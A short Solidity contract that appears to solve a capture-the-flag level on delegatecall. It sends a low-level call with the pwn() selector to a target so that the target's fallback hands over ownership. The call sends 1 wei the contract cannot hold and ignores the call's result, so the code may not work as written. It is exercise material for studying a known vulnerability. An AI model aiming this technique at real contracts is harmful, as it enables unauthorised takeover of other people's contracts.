// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Delagate {
    function pwn() external;
}

contract DelegationSolver {

    function solve(address delegationAddress) public {
        delegationAddress.call{value: 1}(abi.encodeWithSignature("pwn()"));
    }
}
